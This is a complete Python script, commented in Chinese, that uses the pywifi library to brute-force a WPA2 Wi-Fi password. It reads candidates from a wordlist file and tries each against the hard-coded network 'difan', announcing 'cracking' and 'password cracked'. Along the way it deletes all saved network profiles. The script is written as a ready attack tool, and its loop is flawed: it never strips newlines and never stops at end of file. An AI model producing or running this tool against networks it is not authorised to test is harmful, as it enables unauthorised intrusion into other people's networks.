

import pywifi
from pywifi import const
import time

def wifiConnect(wifiname,wifipwd):
    '''wifi测试链接'''
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    #断开WiFi连接
    ifaces.disconnect()
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        #创建WiFi链接文件
        profile = pywifi.Profile()
        #wifi名字
        profile.ssid = wifiname
        #密码
        profile.key = wifipwd
        #wifi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        #加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP

        #删除所有WiFi文件
        ifaces.remove_all_network_profiles()
        #设定新的链接文件
        temp_profile = ifaces.add_network_profile(profile)
        #链接wifi
        ifaces.connect(temp_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

def readPwd():
    '''读取密码本传密码'''
    print("开始破解...")
    path="password.txt"
    file = open(path,"r")
    while True:
        try:
            wifipwd = file.readline()
            bool = wifiConnect('difan',wifipwd)
            if bool:
                print("密码已破解："+wifipwd)
                break
            else:
                print("密码不正确"+wifipwd)
                print(wifipwd)
        except:
            continue
    file.close()

readPwd()
